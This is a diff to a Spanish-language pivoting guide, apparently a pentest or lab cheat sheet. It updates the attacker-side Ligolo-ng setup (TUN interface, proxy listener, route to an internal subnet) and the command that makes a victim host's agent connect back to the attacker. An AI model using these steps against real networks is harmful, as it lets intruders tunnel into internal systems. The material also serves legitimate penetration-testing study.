@@ -18,9 +18,19 @@ Transforma tu máquina atacante en una "máquina dentro de la red interna".
 
 **Paso 1: Configurar interfaz en tu Kali**
 ```bash
-sudo ip link add pwn0 type tun
-sudo ip link set pwn0 up
-./proxy -selfcert
+# Create TUN interface
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+
+# Start proxy
+./proxy -selfcert -laddr 0.0.0.0:11601
+
+# After agent connects, add route to internal network
+sudo ip route add 172.16.1.0/24 dev ligolo
+
+# In ligolo console:
+session          # select agent session
+start            # start tunnel
 ```
 
 **Paso 2: Conectar desde la víctima**
@@ -28,13 +38,6 @@ sudo ip link set pwn0 up
 ./agent -connect <TU_IP>:11601 -ignore-cert
 ```
 
-**Paso 3: Activar el túnel (Interfaz Ligolo)**
-```bash
-# Dentro de la consola de Ligolo:
-session
-# [Elegir sesión activa]
-start
-```
 
 **Paso 4: Añadir ruta en tu Kernel (Kali)**
 ```bash
